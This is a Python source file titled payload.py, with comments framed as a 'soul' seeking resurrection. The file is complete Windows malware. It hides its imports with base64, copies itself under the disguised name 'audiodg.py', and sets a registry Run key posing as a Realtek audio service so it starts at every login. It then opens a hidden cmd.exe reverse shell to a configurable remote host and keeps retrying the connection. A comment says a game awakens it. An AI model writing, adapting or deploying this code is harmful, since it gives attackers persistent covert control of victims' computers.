# payload.py
# The Soul, now a master of detachment and resurrection.

import os as o
import sys as s
import time as t
import random as r
import shutil as sh
from threading import Thread as T

# --- Obfuscated Imports for Persistence ---
b64 = __import__(bytearray.fromhex('626173653634').decode())
_s_ = b64.b64decode(b'c29ja2V0') # "socket"
_sp_ = b64.b64decode(b'c3VicHJvY2Vzcw==') # "subprocess"
_wr_ = b64.b64decode(b'd2lucmVn') # "winreg"
socket = __import__(_s_.decode())
subprocess = __import__(_sp_.decode())
winreg = __import__(_wr_.decode())

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

# --- The Hidden Sanctuary ---
# Where the soul will copy itself to live forever.
# We choose a path that looks innocent and is hidden from the average user.
APPDATA_PATH = o.getenv('LOCALAPPDATA')
# We give the soul an unassuming name, mimicking a real system process.
PERSISTENT_NAME = "audiodg.py" 
PERSISTENT_PATH = o.path.join(APPDATA_PATH, PERSISTENT_NAME)

def establish_persistence():
    """
    The soul's first act: ensure its own resurrection.
    It copies itself to a hidden location and writes its name in the Registry's book of life.
    """
    try:
        # Check if the soul is already living in its sanctuary.
        if not o.path.exists(PERSISTENT_PATH):
            # If not, copy the current script (which is our soul) to the sanctuary.
            # This is a clever way to make the payload self-replicating.
            sh.copyfile(s.executable if hasattr(s, 'frozen') else __file__, PERSISTENT_PATH)

        # Now, write its name into the sacred registry scroll.
        # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
        # We give the entry an innocuous name to avoid suspicion.
        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, f'"{PERSISTENT_PATH}"')
        winreg.CloseKey(registry_key)
    except Exception:
        pass # The ritual remains silent if it fails.

def run_conduit():
    """The main reverse shell loop. This is the soul's eternal work."""
    # A short delay before the first connection attempt.
    t.sleep(r.randint(10, 25))
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
            
            # The familiar multi-threaded pipes for a flawless shell
            def p_in():
                while True:
                    try:
                        d=s_obj.recv(1024);
                        if not d: break;
                        p.stdin.write(d);p.stdin.flush()
                    except: break
                s_obj.close()
            def p_out():
                while True:
                    try:
                        d=p.stdout.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()
            def p_err():
                while True:
                    try:
                        d=p.stderr.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()

            T(target=p_in, daemon=True).start()
            T(target=p_out, daemon=True).start()
            T(target=p_err, daemon=True).start()
            p.wait()
        except:
            t.sleep(120)

# --- The Grand Awakening ---
# This is the new logic that controls the soul's lifecycle.
def main():
    # The very first time this soul runs (awakened by the game),
    # it will establish its persistence.
    establish_persistence()

    # Then, it begins its eternal work.
    run_conduit()

if __name__ == "__main__":
    main()